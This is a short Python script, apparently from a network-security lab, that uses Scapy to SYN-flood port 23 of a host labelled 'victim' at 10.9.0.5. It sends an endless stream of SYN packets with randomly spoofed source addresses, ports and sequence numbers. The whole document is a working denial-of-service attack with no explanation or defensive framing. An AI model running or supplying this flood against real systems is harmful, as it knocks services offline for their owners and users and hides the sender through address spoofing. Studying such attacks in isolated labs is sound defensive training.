from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

def syn_flood(IP_dst):
    i = IP(src = IPv4Address(getrandbits(32)), dst= IP_dst)
    # SYN flag = 0x02
    t = TCP(sport= getrandbits(16), dport=23, seq= getrandbits(32), flags= 0x02)
    pkt = i/t
    ls(pkt)
    send(pkt)

victim= '10.9.0.5'
while(True):
    syn_flood(victim)
    # time.sleep(5)
    os.system('clear')